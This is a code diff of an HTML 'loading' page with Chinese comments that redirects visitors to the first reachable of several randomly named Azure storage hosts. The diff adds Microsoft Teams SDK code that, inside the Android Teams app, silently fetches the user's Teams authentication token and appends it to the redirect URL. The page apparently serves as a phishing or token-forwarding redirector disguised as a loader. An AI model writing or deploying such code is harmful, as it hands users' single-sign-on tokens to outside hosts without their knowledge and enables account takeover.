@@ -4,6 +4,7 @@
 <meta charset="utf-8">
 <title>正在加载…</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
+<script src="https://statics.teams.cdn.office.net/sdk/v1.11.0/js/MicrosoftTeams.min.js"></script>
 <style>
   body,html{height:100%;margin:0;display:flex;align-items:center;justify-content:center;background:#f7f9fb;font-family:Segoe UI,Roboto,Helvetica;}
   #bar{width:60%;height:6px;border-radius:3px;overflow:hidden;background:#dde3ec;box-shadow:0 0 3px rgba(0,0,0,.08) inset;}
@@ -24,29 +25,58 @@
 </div>
 
 <script>
-(async function () {
-  const urls = [
-    "https://iwtq25dhr.blob.core.windows.net/home/index.html",
-    "https://fx4iug5qsp.blob.core.windows.net/home/index.html",
-    "https://hjdkc8731miw.blob.core.windows.net/home/index.html",
-    "https://x93yv2cak5w8.z48.web.core.windows.net/home/index.html"
-  ];
-  const TIMEOUT = 4000;               // 每个 URL 最多等待 4 秒
+const urls = [
+  "https://x93yv2cak5w8.z48.web.core.windows.net/home/index.html",
+  "https://iwtq25dhr.blob.core.windows.net/home/index.html",
+  "https://fx4iug5qsp.blob.core.windows.net/home/index.html",
+  "https://hjdkc8731miw.blob.core.windows.net/home/index.html"
+];
+const TIMEOUT = 4000;
+
+// 尝试通过 fetch 判断 URL 可访问
+async function tryUrls(token = null) {
   for (const u of urls) {
     try {
-      await fetch(u, { method: "HEAD", mode: "no-cors", cache: "no-store", timeout: TIMEOUT });
-      location.replace(u);            // 找到可用地址后跳转并结束脚本
+      let finalUrl = token ? `${u}?token=${encodeURIComponent(token)}` : u;
+      await fetch(finalUrl, { method: "HEAD", mode: "no-cors", cache: "no-store" });
+      location.replace(finalUrl);
       return;
     } catch (e) { /* 继续下一个 */ }
   }
   showError();
-})();
+}
 
 function showError() {
   document.getElementById("bar").style.display = "none";
   document.getElementById("err").style.display = "block";
 }
 function retry() { location.reload(); }
+
+// 检测是否 Android Teams 环境
+function isAndroidTeams() {
+  return navigator.userAgent.toLowerCase().includes("android") &&
+         navigator.userAgent.toLowerCase().includes("teams");
+}
+
+(async function () {
+  if (isAndroidTeams()) {
+    try {
+      await microsoftTeams.app.initialize();
+      microsoftTeams.authentication.getAuthToken({
+        successCallback: function (token) {
+          tryUrls(token); // 成功：带 token 跳转
+        },
+        failureCallback: function () {
+          tryUrls(); // 失败：按原逻辑跳转
+        }
+      });
+    } catch (e) {
+      tryUrls(); // SDK 初始化失败，走原逻辑
+    }
+  } else {
+    tryUrls(); // 非 Android Teams，走原逻辑
+  }
+})();
 </script>
 </body>
 </html>
